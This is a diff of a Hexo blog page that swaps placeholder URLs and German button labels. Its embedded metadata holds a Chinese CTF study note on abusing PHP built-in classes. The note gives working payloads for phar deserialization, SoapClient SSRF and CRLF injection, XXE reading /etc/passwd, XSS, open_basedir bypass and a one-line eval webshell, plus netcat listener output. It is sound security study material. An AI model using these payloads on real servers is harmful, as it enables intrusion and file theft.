@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"最近做题碰到了好多php的扩展，总结一下\n\n\nphar类似于java的war，是php的一个打包文件，里面有一个setMetadata  这一部分数据在反序列化时，会被解析\n测试123456789101112131415161718192021&lt;?php    class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='phpinfo();';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;@unlink('phar.phar'); $phar=new phar(\"phar.phar\");         //后缀名必须为phar$phar-&gt;startBuffering();             //开始缓冲Phar写操作$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //phar文件标志，可以加上其他文件头，以绕过检测 \"GIF89a\".\"&lt;?php __HALT_COMPILER();\"  $o=new User();$phar-&gt;setMetadata($o);             //添加meta-data数据$phar-&gt;addFromString(\"test.txt\",\"test\");$phar-&gt;stopBuffering();?&gt;\n\n后台代码\n1234567891011121314&lt;?phpfile_get_contents($_GET['url']);class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;?&gt;\n\n访问一下\n?url=phar://phar.phar/test.txt\nSoapclient需要安装soapclient扩展，当调用一个不可访问的方法时，会触发__call方法，向location参数发起请求\n测试1234567&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://example.com:5555', 'location'=&gt;'http://192.168.110.140:5555/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();?&gt;\n\nnc监听\n1234567891011root@kali:/var/www/html# nc -lvp 5555listening on [any] 5555 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.140] from (UNKNOWN) [192.168.110.1] 3669POST /aaa HTTP/1.1Host: 192.168.110.140:5555Connection: Keep-AliveUser-Agent: PHP-SOAP/5.6.27Content-Type: text/xml; charset=utf-8SOAPAction: \"http://example.com:5555#a\"Content-Length: 384\n\n利用SSRF1234&lt;?php$a = new SoapClient(null,array('uri'=&gt;'hello', 'location'=&gt;'http://127.0.0.1/admin.php'));$b = serialize($a);echo urlencode($b);\n\nCRLF放上wupco师傅的脚本\n1234567891011&lt;?php$target = \"http://example.com:5555/\";$post_string = 'data=abc';$headers = array(    'X-Forwarded-For: 127.0.0.1',    'Cookie: PHPSESSID=45466464dsdwe');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa);\n\nZipArchiveZipArchive的open方法\n12ZIPARCHIVE::OVERWRITE (integer)总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。\n\n再覆盖一个文件之前，会先删除掉之前的文件\n123ZipArchive::open ( string $filename [, int $flags ] ) : mixed第一个参数是文件名第二个参数是打开文件的模式  当为9时，对应ZipArchive::CREATE | ZipArchive::OVERWRITE\n\n测试phpinfo.php写入\n123&lt;?php phpinfo(); ?&gt;\n\ntest.php\n123&lt;?php$a = new ZipArchive();$a-&gt;open(&apos;phpinfo.php&apos;,ZipArchive::OVERWRITE);\n\n访问一下test.php  phpinfo.php就没了\nException__tostring xss\n适用版本php 5 7\n12$a = new Exception(\"&lt;script&gt;alert(1)&lt;/script&gt;\");echo $a;\n\nError__tostring 可以触发xss\n测试12$a = new Error(\"&lt;script&gt;alert(1)&lt;/script&gt;\");echo $a; //触发__tostring\n\n只适用php7\n\nDirectoryIterator列目录123456789101112131415&lt;?phpprintf('open_basedir: %s &lt;/br&gt;',ini_get('open_basedir'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f)&#123;$file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f)&#123;$file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach ($file_list as $f)&#123;echo \"&#123;$f&#125;&lt;br/&gt;\";&#125;\n\nfinfo该类在 fileinfo 函数集中提供了一个面向对象的接口。\n改一下扩展php.ini,去掉分号\n1extension=php_fileinfo.dll\n\n读文件测试\n12345&lt;?phpini_set('display_errors', 'on');ini_set('error_reporting', E_ALL);echo new finfo(1,'shell.php');?&gt;\n\n新建一个shell.php写入\n1&lt;?php eval($_POST[shell]);?&gt;\n\n\n列目录12345&lt;?phpini_set('display_errors', 'on');ini_set('error_reporting', E_ALL);echo new finfo(1,var_dump(scandir('./')));?&gt;\n\n\nSplFileObject::__construct用来创建一个新的文件对象，可以传入一个url，类似于fopen，向外发送一个请求\n测试12345678910&lt;?php$url='http://192.168.110.140:9999';$a=new SplFileObject($url);?&gt;    fopen的&lt;?php$url='http://192.168.110.140:9999';$a=fopen($url,'r');?&gt;\n\nkali监听一下\n123456root@kali:~# nc -lvp 9999listening on [any] 9999 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.140] from (UNKNOWN) [192.168.110.1] 1195GET / HTTP/1.0Host: 192.168.110.140:9999\n\nSimpleXMLElement用来获取xml文本的方式，既然可以用来获取xml 那就可以xxe了\n测试12345&lt;?php$data = file_get_contents('php://input');$xml = new SimpleXMLElement($data);echo $xml-&gt;name;\n\npayload\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\n\nDOMDocument解析xml文档的一个对象\n测试1234567&lt;?php$data = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom);\n\npayload\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\nlibcurl测试任意文件读取1全部数据使用HTTP协议中的 &quot;POST&quot; 操作来发送。 要发送文件，在文件名前面加上@前缀并使用完整路径。 文件类型可在文件名后以 &apos;;type=mimetype&apos; 的格式指定。 这个参数可以是 urlencoded 后的字符串，类似&apos;para1=val1&amp;para2=val2&amp;...&apos;，也可以使用一个以字段名为键值，字段数据为值的数组。 如果value是一个数组，Content-Type头将会被设置成multipart/form-data。 从 PHP 5.2.0 开始，使用 @ 前缀传递文件时，value 必须是个数组。 从 PHP 5.5.0 开始, @ 前缀已被废弃，文件可通过 CURLFile 发送。 设置 CURLOPT_SAFE_UPLOAD 为 TRUE 可禁用 @ 前缀发送文件(默认为flase)，以增加安全性。\n\n12345678910111213&lt;?php$url = $_GET['url'];$username = isset($_GET['username'])?$_GET['username']:\"admin\";$data = array(    \"username\"=&gt; $username);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_SAFE_UPLOAD,0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch,CURLOPT_POSTFIELDS,$data);$res = curl_exec($ch);echo $res;\n\n本地监听9999\n1http://127.0.0.1/test.php?url=http://127.0.0.1:9999/&amp;username=@test.php\n\n回显\n12345678910111213141516171819202122232425POST / HTTP/1.1Host: 127.0.0.1:9999Accept: */*Content-Length: 569Expect: 100-continueContent-Type: multipart/form-data; boundary=------------------------e4e06fcc0cae82c8--------------------------e4e06fcc0cae82c8Content-Disposition: form-data; name=\"username\"; filename=\"test.php\"Content-Type: application/octet-stream&lt;?php$url = $_GET['url'];$username = isset($_GET['username'])?$_GET['username']:\"admin\";$data = array(    \"username\"=&gt; $username);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_SAFE_UPLOAD,0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch,CURLOPT_POSTFIELDS,$data);$res = curl_exec($ch);echo $res;--------------------------e4e06fcc0cae82c8--\n\n@符号匹配第一个@后面符合格式的host \nhttp://u:p@a.com:80@b.com/index.php\nlibcurl的解析结果\n12345schema: httphost: a.comuser: upass: pport: 80\n\n参考链接https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\nhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html\nhttps://www.anquanke.com/post/id/167140\nhttp://wonderkun.cc/index.html/?p=670\n","dateCreated":"2019-10-20T16:26:54+08:00","dateModified":"2020-02-26T14:40:39+08:00","datePublished":"2019-10-20T16:26:54+08:00","description":"最近做题碰到了好多php的扩展，总结一下","headline":"PHP原生类及扩展总结","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"最近做题碰到了好多php的扩展，总结一下\n\n\nphar类似于java的war，是php的一个打包文件，里面有一个setMetadata  这一部分数据在反序列化时，会被解析\n测试123456789101112131415161718192021&lt;?php    class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='phpinfo();';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;@unlink('phar.phar'); $phar=new phar(\"phar.phar\");         //后缀名必须为phar$phar-&gt;startBuffering();             //开始缓冲Phar写操作$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //phar文件标志，可以加上其他文件头，以绕过检测 \"GIF89a\".\"&lt;?php __HALT_COMPILER();\"  $o=new User();$phar-&gt;setMetadata($o);             //添加meta-data数据$phar-&gt;addFromString(\"test.txt\",\"test\");$phar-&gt;stopBuffering();?&gt;\n\n后台代码\n1234567891011121314&lt;?phpfile_get_contents($_GET['url']);class User&#123;    public $a;    public function __construct()    &#123;        $this-&gt;a='';    &#125;    public function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;?&gt;\n\n访问一下\n?url=phar://phar.phar/test.txt\nSoapclient需要安装soapclient扩展，当调用一个不可访问的方法时，会触发__call方法，向location参数发起请求\n测试1234567&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://example.com:5555', 'location'=&gt;'http://192.168.110.140:5555/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();?&gt;\n\nnc监听\n1234567891011root@kali:/var/www/html# nc -lvp 5555listening on [any] 5555 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.140] from (UNKNOWN) [192.168.110.1] 3669POST /aaa HTTP/1.1Host: 192.168.110.140:5555Connection: Keep-AliveUser-Agent: PHP-SOAP/5.6.27Content-Type: text/xml; charset=utf-8SOAPAction: \"http://example.com:5555#a\"Content-Length: 384\n\n利用SSRF1234&lt;?php$a = new SoapClient(null,array('uri'=&gt;'hello', 'location'=&gt;'http://127.0.0.1/admin.php'));$b = serialize($a);echo urlencode($b);\n\nCRLF放上wupco师傅的脚本\n1234567891011&lt;?php$target = \"http://example.com:5555/\";$post_string = 'data=abc';$headers = array(    'X-Forwarded-For: 127.0.0.1',    'Cookie: PHPSESSID=45466464dsdwe');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa);\n\nZipArchiveZipArchive的open方法\n12ZIPARCHIVE::OVERWRITE (integer)总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。\n\n再覆盖一个文件之前，会先删除掉之前的文件\n123ZipArchive::open ( string $filename [, int $flags ] ) : mixed第一个参数是文件名第二个参数是打开文件的模式  当为9时，对应ZipArchive::CREATE | ZipArchive::OVERWRITE\n\n测试phpinfo.php写入\n123&lt;?php phpinfo(); ?&gt;\n\ntest.php\n123&lt;?php$a = new ZipArchive();$a-&gt;open(&apos;phpinfo.php&apos;,ZipArchive::OVERWRITE);\n\n访问一下test.php  phpinfo.php就没了\nException__tostring xss\n适用版本php 5 7\n12$a = new Exception(\"&lt;script&gt;alert(1)&lt;/script&gt;\");echo $a;\n\nError__tostring 可以触发xss\n测试12$a = new Error(\"&lt;script&gt;alert(1)&lt;/script&gt;\");echo $a; //触发__tostring\n\n只适用php7\n\nDirectoryIterator列目录123456789101112131415&lt;?phpprintf('open_basedir: %s &lt;/br&gt;',ini_get('open_basedir'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f)&#123;$file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f)&#123;$file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach ($file_list as $f)&#123;echo \"&#123;$f&#125;&lt;br/&gt;\";&#125;\n\nfinfo该类在 fileinfo 函数集中提供了一个面向对象的接口。\n改一下扩展php.ini,去掉分号\n1extension=php_fileinfo.dll\n\n读文件测试\n12345&lt;?phpini_set('display_errors', 'on');ini_set('error_reporting', E_ALL);echo new finfo(1,'shell.php');?&gt;\n\n新建一个shell.php写入\n1&lt;?php eval($_POST[shell]);?&gt;\n\n\n列目录12345&lt;?phpini_set('display_errors', 'on');ini_set('error_reporting', E_ALL);echo new finfo(1,var_dump(scandir('./')));?&gt;\n\n\nSplFileObject::__construct用来创建一个新的文件对象，可以传入一个url，类似于fopen，向外发送一个请求\n测试12345678910&lt;?php$url='http://192.168.110.140:9999';$a=new SplFileObject($url);?&gt;    fopen的&lt;?php$url='http://192.168.110.140:9999';$a=fopen($url,'r');?&gt;\n\nkali监听一下\n123456root@kali:~# nc -lvp 9999listening on [any] 9999 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.140] from (UNKNOWN) [192.168.110.1] 1195GET / HTTP/1.0Host: 192.168.110.140:9999\n\nSimpleXMLElement用来获取xml文本的方式，既然可以用来获取xml 那就可以xxe了\n测试12345&lt;?php$data = file_get_contents('php://input');$xml = new SimpleXMLElement($data);echo $xml-&gt;name;\n\npayload\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\n\nDOMDocument解析xml文档的一个对象\n测试1234567&lt;?php$data = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom);\n\npayload\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\nlibcurl测试任意文件读取1全部数据使用HTTP协议中的 &quot;POST&quot; 操作来发送。 要发送文件，在文件名前面加上@前缀并使用完整路径。 文件类型可在文件名后以 &apos;;type=mimetype&apos; 的格式指定。 这个参数可以是 urlencoded 后的字符串，类似&apos;para1=val1&amp;para2=val2&amp;...&apos;，也可以使用一个以字段名为键值，字段数据为值的数组。 如果value是一个数组，Content-Type头将会被设置成multipart/form-data。 从 PHP 5.2.0 开始，使用 @ 前缀传递文件时，value 必须是个数组。 从 PHP 5.5.0 开始, @ 前缀已被废弃，文件可通过 CURLFile 发送。 设置 CURLOPT_SAFE_UPLOAD 为 TRUE 可禁用 @ 前缀发送文件(默认为flase)，以增加安全性。\n\n12345678910111213&lt;?php$url = $_GET['url'];$username = isset($_GET['username'])?$_GET['username']:\"admin\";$data = array(    \"username\"=&gt; $username);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_SAFE_UPLOAD,0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch,CURLOPT_POSTFIELDS,$data);$res = curl_exec($ch);echo $res;\n\n本地监听9999\n1http://127.0.0.1/test.php?url=http://127.0.0.1:9999/&amp;username=@test.php\n\n回显\n12345678910111213141516171819202122232425POST / HTTP/1.1Host: 127.0.0.1:9999Accept: */*Content-Length: 569Expect: 100-continueContent-Type: multipart/form-data; boundary=------------------------e4e06fcc0cae82c8--------------------------e4e06fcc0cae82c8Content-Disposition: form-data; name=\"username\"; filename=\"test.php\"Content-Type: application/octet-stream&lt;?php$url = $_GET['url'];$username = isset($_GET['username'])?$_GET['username']:\"admin\";$data = array(    \"username\"=&gt; $username);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_SAFE_UPLOAD,0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch,CURLOPT_POSTFIELDS,$data);$res = curl_exec($ch);echo $res;--------------------------e4e06fcc0cae82c8--\n\n@符号匹配第一个@后面符合格式的host \nhttp://u:p@a.com:80@b.com/index.php\nlibcurl的解析结果\n12345schema: httphost: a.comuser: upass: pport: 80\n\n参考链接https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\nhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html\nhttps://www.anquanke.com/post/id/167140\nhttp://wonderkun.cc/index.html/?p=670\n","dateCreated":"2019-10-20T16:26:54+08:00","dateModified":"2020-02-26T14:40:39+08:00","datePublished":"2019-10-20T16:26:54+08:00","description":"最近做题碰到了好多php的扩展，总结一下","headline":"PHP原生类及扩展总结","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"}</script>
     <meta name="description" content="最近做题碰到了好多php的扩展，总结一下">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="PHP原生类及扩展总结">
-<meta property="og:url" content="http://yoursite.com/2019/10/20/PHP原生类及扩展总结/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="最近做题碰到了好多php的扩展，总结一下">
 <meta property="og:locale" content="zh-cn">
@@ -353,7 +353,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -364,7 +364,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -377,7 +377,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -390,7 +390,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -403,7 +403,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -468,7 +468,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -479,7 +479,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -492,7 +492,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -505,7 +505,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -518,7 +518,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -539,7 +539,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -552,7 +552,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -565,7 +565,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/20/PHP原生类及扩展总结/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/20/PHP原生类及扩展总结/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
